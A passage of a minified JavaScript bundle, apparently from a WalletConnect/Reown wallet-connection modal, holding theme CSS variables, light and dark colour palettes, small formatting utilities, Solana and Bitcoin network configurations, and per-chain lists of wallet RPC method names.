        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;
        --wui-icon-size-xl: 24px;
        --wui-icon-size-xxl: 28px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-visual-size-size-inherit: inherit;
        --wui-visual-size-sm: 40px;
        --wui-visual-size-md: 55px;
        --wui-visual-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network-sm: path(
          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
        );

        --wui-path-network-md: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-width-network-sm: 36px;
        --wui-width-network-md: 48px;
        --wui-width-network-lg: 86px;

        --wui-height-network-sm: 40px;
        --wui-height-network-md: 54px;
        --wui-height-network-lg: 96px;

        --wui-icon-size-network-xs: 12px;
        --wui-icon-size-network-sm: 16px;
        --wui-icon-size-network-md: 24px;
        --wui-icon-size-network-lg: 42px;

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(20, 20, 20, 0.8);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-success-125: var(--wui-color-success-base-125);

        --wui-color-warning-100: var(--wui-color-warning-base-100);

        --wui-color-error-100: var(--wui-color-error-base-100);
        --wui-color-error-125: var(--wui-color-error-base-125);

        --wui-color-blue-100: var(--wui-color-blue-base-100);
        --wui-color-blue-90: var(--wui-color-blue-base-90);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-wallet-button-bg: var(--wui-wallet-button-bg-base);

        --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);

          --wui-color-accent-100: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 100%,
            transparent
          );
          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-color-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-color-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-color-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-300)
          );
          --wui-color-fg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-325)
          );
          --wui-color-fg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-350)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-300)
          );
          --wui-color-bg-325: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-325)
          );
          --wui-color-bg-350: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-350)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-success-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-125)
          );

          --wui-color-warning-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-warning-base-100)
          );

          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );
          --wui-color-blue-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-100)
          );
          --wui-color-blue-90: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-blue-base-90)
          );
          --wui-color-error-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-125)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );

          --wui-wallet-button-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-wallet-button-bg-base)
          );
        }
      }
    `,light:ge`
      :root {
        --w3m-color-mix: ${Tn(r?.["--w3m-color-mix"]||"#fff")};
        --w3m-accent: ${Tn(Lf(r,"dark")["--w3m-accent"])};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: ${Tn(Lf(r,"dark")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
        --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
        --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
        --wui-color-blueberry-050: hsla(231, 100%, 70%, 0.1);

        --wui-color-fg-100: #e4e7e7;
        --wui-color-fg-125: #d0d5d5;
        --wui-color-fg-150: #a8b1b1;
        --wui-color-fg-175: #a8b0b0;
        --wui-color-fg-200: #949e9e;
        --wui-color-fg-225: #868f8f;
        --wui-color-fg-250: #788080;
        --wui-color-fg-275: #788181;
        --wui-color-fg-300: #6e7777;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #363636;

        --wui-color-bg-100: #141414;
        --wui-color-bg-125: #191a1a;
        --wui-color-bg-150: #1e1f1f;
        --wui-color-bg-175: #222525;
        --wui-color-bg-200: #272a2a;
        --wui-color-bg-225: #2c3030;
        --wui-color-bg-250: #313535;
        --wui-color-bg-275: #363b3b;
        --wui-color-bg-300: #3b4040;
        --wui-color-bg-325: #252525;
        --wui-color-bg-350: #ffffff;

        --wui-color-success-base-100: #26d962;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f25a67;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
        --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
        --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
        --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
        --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
        --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
        --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
        --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
        --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
        --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
        --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);

        --wui-color-dark-glass-100: rgba(42, 42, 42, 1);

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --w3m-card-embedded-shadow-color: rgb(17 17 18 / 25%);
      }
    `,dark:ge`
      :root {
        --w3m-color-mix: ${Tn(r?.["--w3m-color-mix"]||"#000")};
        --w3m-accent: ${Tn(Lf(r,"light")["--w3m-accent"])};
        --w3m-default: #000;

        --wui-color-modal-bg-base: ${Tn(Lf(r,"light")["--w3m-background"])};
        --wui-color-accent-base-100: var(--w3m-accent);

        --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
        --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
        --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);

        --wui-color-fg-100: #141414;
        --wui-color-fg-125: #2d3131;
        --wui-color-fg-150: #474d4d;
        --wui-color-fg-175: #636d6d;
        --wui-color-fg-200: #798686;
        --wui-color-fg-225: #828f8f;
        --wui-color-fg-250: #8b9797;
        --wui-color-fg-275: #95a0a0;
        --wui-color-fg-300: #9ea9a9;
        --wui-color-fg-325: #9a9a9a;
        --wui-color-fg-350: #d0d0d0;

        --wui-color-bg-100: #ffffff;
        --wui-color-bg-125: #f5fafa;
        --wui-color-bg-150: #f3f8f8;
        --wui-color-bg-175: #eef4f4;
        --wui-color-bg-200: #eaf1f1;
        --wui-color-bg-225: #e5eded;
        --wui-color-bg-250: #e1e9e9;
        --wui-color-bg-275: #dce7e7;
        --wui-color-bg-300: #d8e3e3;
        --wui-color-bg-325: #f3f3f3;
        --wui-color-bg-350: #202020;

        --wui-color-success-base-100: #26b562;
        --wui-color-success-base-125: #30a46b;

        --wui-color-warning-base-100: #f3a13f;

        --wui-color-error-base-100: #f05142;
        --wui-color-error-base-125: #df4a34;

        --wui-color-blue-base-100: rgba(102, 125, 255, 1);
        --wui-color-blue-base-90: rgba(102, 125, 255, 0.9);

        --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
        --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
        --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
        --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
        --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
        --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
        --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
        --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
        --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
        --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);

        --wui-color-success-glass-reown-020: rgba(48, 164, 107, 0.2);

        --wui-color-warning-glass-reown-020: rgba(243, 161, 63, 0.2);

        --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
        --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
        --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
        --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
        --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
        --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
        --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
        --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
        --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
        --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);

        --wui-color-error-glass-reown-020: rgba(223, 74, 52, 0.2);

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-wallet-button-bg-base: var(--wui-color-bg-125);

        --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
        --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);

        --wui-color-dark-glass-100: rgba(233, 233, 233, 1);

        --w3m-card-embedded-shadow-color: rgb(224 225 233 / 25%);
      }
    `}}const Ii=ge`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,vo=ge`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      box-shadow var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border, box-shadow, border-radius;
    outline: none;
    border: none;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  wui-flex {
    transition: border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius;
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-gray-glass-005);
    }

    button:active:enabled {
      background-color: var(--wui-color-gray-glass-010);
    }
  }

  button:disabled > wui-icon-box {
    opacity: 0.5;
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,c6=ge`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-blue-100 {
    color: var(--wui-color-blue-100);
  }

  .wui-color-blue-90 {
    color: var(--wui-color-blue-90);
  }

  .wui-color-error-125 {
    color: var(--wui-color-error-125);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-success-125 {
    color: var(--wui-color-success-125);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    color: var(--wui-color-fg-350);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-error-125 {
    background-color: var(--wui-color-error-125);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-success-125 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }

  .wui-color-fg-325 {
    background-color: var(--wui-color-fg-325);
  }

  .wui-color-fg-350 {
    background-color: var(--wui-color-fg-350);
  }
`,Us={getSpacingStyles(r,e){if(Array.isArray(r))return r[e]?`var(--wui-spacing-${r[e]})`:void 0;if(typeof r=="string")return`var(--wui-spacing-${r})`},getFormattedDate(r){return new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(r)},getHostName(r){try{return new URL(r).hostname}catch{return""}},getTruncateString({string:r,charsStart:e,charsEnd:t,truncate:i}){return r.length<=e+t?r:i==="end"?`${r.substring(0,e)}...`:i==="start"?`...${r.substring(r.length-t)}`:`${r.substring(0,Math.floor(e))}...${r.substring(r.length-Math.floor(t))}`},generateAvatarColors(r){const t=r.toLowerCase().replace(/^0x/iu,"").replace(/[^a-f0-9]/gu,"").substring(0,6).padEnd(6,"0"),i=this.hexToRgb(t),n=getComputedStyle(document.documentElement).getPropertyValue("--w3m-border-radius-master"),o=100-3*Number(n?.replace("px","")),a=`${o}% ${o}% at 65% 40%`,c=[];for(let l=0;l<5;l+=1){const u=this.tintColor(i,.15*l);c.push(`rgb(${u[0]}, ${u[1]}, ${u[2]})`)}return`
    --local-color-1: ${c[0]};
    --local-color-2: ${c[1]};
    --local-color-3: ${c[2]};
    --local-color-4: ${c[3]};
    --local-color-5: ${c[4]};
    --local-radial-circle: ${a}
   `},hexToRgb(r){const e=parseInt(r,16),t=e>>16&255,i=e>>8&255,n=e&255;return[t,i,n]},tintColor(r,e){const[t,i,n]=r,s=Math.round(t+(255-t)*e),o=Math.round(i+(255-i)*e),a=Math.round(n+(255-n)*e);return[s,o,a]},isNumber(r){return{number:/^[0-9]+$/u}.number.test(r)},getColorTheme(r){return r||(typeof window<"u"&&window.matchMedia?window.matchMedia("(prefers-color-scheme: dark)")?.matches?"dark":"light":"dark")},splitBalance(r){const e=r.split(".");return e.length===2?[e[0],e[1]]:["0","00"]},roundNumber(r,e,t){return r.toString().length>=e?Number(r).toFixed(t):r},formatNumberToLocalString(r,e=2){return r===void 0?"0.00":typeof r=="number"?r.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(r).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})}};function jdt(r,e){const{kind:t,elements:i}=e;return{kind:t,elements:i,finisher(n){customElements.get(r)||customElements.define(r,n)}}}function Fdt(r,e){return customElements.get(r)||customElements.define(r,e),e}function Ot(r){return function(t){return typeof t=="function"?Fdt(r,t):jdt(r,t)}}const p5={ERROR_CODE_UNRECOGNIZED_CHAIN_ID:4902,ERROR_CODE_DEFAULT:5e3,ERROR_INVALID_CHAIN_ID:32603,DEFAULT_ALLOWED_ANCESTORS:["http://localhost:*","https://*.pages.dev","https://*.vercel.app","https://*.ngrok-free.app","https://secure-mobile.walletconnect.com","https://secure-mobile.walletconnect.org"]};function l6(r){return{formatters:void 0,fees:void 0,serializers:void 0,...r}}const qG=l6({id:"5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",name:"Solana",network:"solana-mainnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!1,chainNamespace:"solana",caipNetworkId:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",deprecatedCaipNetworkId:"solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"}),zG=l6({id:"EtWTRABZaYq6iMfeYKouRu166VU2xqa1",name:"Solana Devnet",network:"solana-devnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1",deprecatedCaipNetworkId:"solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K"});l6({id:"4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z",name:"Solana Testnet",network:"solana-testnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z"});l6({id:"000000000019d6689c085ae165831e93",caipNetworkId:"bip122:000000000019d6689c085ae165831e93",chainNamespace:"bip122",name:"Bitcoin",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}});l6({id:"000000000933ea01ad0ee984209779ba",caipNetworkId:"bip122:000000000933ea01ad0ee984209779ba",chainNamespace:"bip122",name:"Bitcoin Testnet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});const qdt={solana:["solana_signMessage","solana_signTransaction","solana_requestAccounts","solana_getAccounts","solana_signAllTransactions","solana_signAndSendTransaction"],eip155:["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_showCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"],bip122:["sendTransfer","signMessage","signPsbt","getAccountAddresses"]},P9={getMethodsByChainNamespace(r){return qdt[r]||[]},createDefaultNamespace(r){return{methods:this.getMethodsByChainNamespace(r),events:["accountsChanged","chainChanged"],chains:[],rpcMap:{}}},applyNamespaceOverrides(r,e){if(!e)return{...r};const t={...r},i=new 